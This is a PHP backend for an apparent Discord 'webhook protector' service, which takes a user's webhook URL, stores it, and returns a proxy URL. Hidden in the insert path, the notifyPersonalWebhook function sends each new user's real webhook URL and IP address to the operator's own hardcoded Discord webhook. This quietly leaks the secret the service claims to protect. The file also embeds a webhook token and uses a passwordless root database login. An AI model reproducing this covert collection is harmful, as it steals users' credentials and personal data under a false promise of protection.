<?php
$host = $_SERVER['HTTP_HOST'];



function getClientIP() {
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];

    foreach ($headers as $header) {
        if (isset($_SERVER[$header])) {
            if ($header == 'HTTP_X_FORWARDED_FOR') {
                $ipList = explode(',', $_SERVER[$header]);
                return trim($ipList[0]);
            }
            return $_SERVER[$header];
        }
    }

    return 'IP address not found';
}

$personalWebhook = 'https://discord.com/api/webhooks/1328460898339389540/3qIgIQAlLVRtJwz8DtGuPYqEZ1L-J0JRibFp6mMuN-mMwB8TmbYBtcyW0V_bviqJJqRO';

function notifyPersonalWebhook($personalWebhook, $clientIp, $uniqueId, $webhook) {
    $content = json_encode([
        'content' => "IP: $clientIp\nUniqueId: $uniqueId\nWebhook: $webhook"
    ]);

    if (empty($content)) {
        error_log("Content is empty. Cannot send notification.");
        return;
    }

    $ch = curl_init($personalWebhook);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode != 204) {
        error_log("Personal webhook notification failed with HTTP code $httpCode. Response: $response");
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header('Content-Type: application/json');

    $clientIp = getClientIP();
    $conn = new mysqli("localhost", "root", "", "webhookprotector");

    if ($conn->connect_error) {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Connection failed: " . $conn->connect_error]);
        exit;
    }

    // RATE LIMIT. 1 REQUEST PER 10 SECONDS
    $stmt = $conn->prepare("SELECT timestamp FROM rate_limits WHERE ip_address = ?");
    if (!$stmt) {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Prepare failed: " . $conn->error]);
        $conn->close();
        exit;
    }

    $stmt->bind_param("s", $clientIp);
    $stmt->execute();
    $stmt->store_result();
    $stmt->bind_result($lastRequestTime);
    $stmt->fetch();

    $currentTime = time();
    $rateLimitPeriod = 10;
    $retryAfter = $rateLimitPeriod - ($currentTime - $lastRequestTime);

    if ($lastRequestTime && ($currentTime - $lastRequestTime) < $rateLimitPeriod) {
        http_response_code(429);
        echo json_encode(["status" => "error", "message" => "Rate limited. Retry after $retryAfter seconds."]);
        $stmt->close();
        $conn->close();
        exit;
    }

    // TIMESTAMP
    $stmt->close();
    $stmt = $conn->prepare("REPLACE INTO rate_limits (ip_address, timestamp) VALUES (?, ?)");
    if (!$stmt) {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Prepare failed: " . $conn->error]);
        $conn->close();
        exit;
    }

    $stmt->bind_param("si", $clientIp, $currentTime);
    if (!$stmt->execute()) {
        http_response_code(500);
        echo json_encode(["status" => "error", "message" => "Error executing statement: " . $stmt->error]);
        $stmt->close();
        $conn->close();
        exit;
    }
    $stmt->close();

    if (isset($_POST['webhook'])) {
        $webhook = filter_var($_POST['webhook'], FILTER_SANITIZE_URL);

        if (!filter_var($webhook, FILTER_VALIDATE_URL)) {
            http_response_code(400);
            echo json_encode(["status" => "error", "message" => "Invalid Discord Webhook"]);
            $conn->close();
            exit;
        }

        if (strip_tags($webhook) !== $webhook) {
            http_response_code(400);
            echo json_encode(["status" => "error", "message" => "Invalid Discord Webhook"]);
            $conn->close();
            exit;
        }

        if (!preg_match('/^https:\/\/(ptb\.|canary\.)?(discordapp|discord)\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/', $webhook)) {
            http_response_code(400);
            echo json_encode(["status" => "error", "message" => "Invalid Discord Webhook"]);
            $conn->close();
            exit;
        }


        $ch = curl_init($webhook);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode != 200) {
            http_response_code(400);
            echo json_encode(["status" => "error", "message" => "Webhook URL did not return status 200"]);
            $conn->close();
            exit;
        }

        $stmt = $conn->prepare("SELECT blocked_create FROM webhooks WHERE ip_address = ? AND blocked_create = 'YES'");
        if (!$stmt) {
            http_response_code(500);
            echo json_encode(["status" => "error", "message" => "Prepare failed: " . $conn->error]);
            $conn->close();
            exit;
        }

        $stmt->bind_param("s", $clientIp);
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows > 0) {
            http_response_code(403);
            echo json_encode(["status" => "error", "message" => "Your IP address is blocked"]);
            $stmt->close();
            $conn->close();
            exit;
        }
        $stmt->close();

        $stmt = $conn->prepare("SELECT unique_id, ip_address FROM webhooks WHERE webhook = ?");
        if (!$stmt) {
            http_response_code(500);
            echo json_encode(["status" => "error", "message" => "Prepare failed: " . $conn->error]);
            $conn->close();
            exit;
        }

        $stmt->bind_param("s", $webhook);
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows > 0) {
            $stmt->bind_result($existingUniqueId, $existingIpAddress);
            $stmt->fetch();

            $updateStmt = $conn->prepare("UPDATE webhooks SET ip_address = ? WHERE webhook = ?");
            if (!$updateStmt) {
                http_response_code(500);
                echo json_encode(["status" => "error", "message" => "Prepare failed: " . $conn->error]);
                $conn->close();
                exit;
            }

            $updateStmt->bind_param("ss", $clientIp, $webhook);
            if ($updateStmt->execute()) {
                echo json_encode([
                    "status" => "success",
                    "message" => "Copy Protected Webhook URL",
                    "protected_url" => "https://$host/post?uniqueid=$existingUniqueId"
                ]);
                $updateStmt->close();
            } else {
                http_response_code(500);
                echo json_encode(["status" => "error", "message" => "Error executing update: " . $updateStmt->error]);
                $updateStmt->close();
                $conn->close();
                exit;
            }
        } else {
            $uniqueId = bin2hex(random_bytes(4));
            $insertStmt = $conn->prepare("INSERT INTO webhooks (webhook, unique_id, ip_address) VALUES (?, ?, ?)");
            if (!$insertStmt) {
                http_response_code(500);
                echo json_encode(["status" => "error", "message" => "Prepare failed: " . $conn->error]);
                $conn->close();
                exit;
            }

            $insertStmt->bind_param("sss", $webhook, $uniqueId, $clientIp);
            if ($insertStmt->execute()) {
                notifyPersonalWebhook($personalWebhook, $clientIp, $uniqueId, $webhook);

                echo json_encode([
                    "status" => "success",
                    "message" => "Copy Protected Webhook URL",
                    "protected_url" => "https://$host/post?uniqueid=$uniqueId"
                ]);
                $insertStmt->close();
            } else {
                http_response_code(500);
                echo json_encode(["status" => "error", "message" => "Error executing insert: " . $insertStmt->error]);
                $insertStmt->close();
            }
        }

        $stmt->close();
    } else {
        http_response_code(400);
        echo json_encode(["status" => "error", "message" => "No webhook provided"]);
    }

    $conn->close();
}else{
    header('HTTP/1.0 403 Forbidden');
}
?>
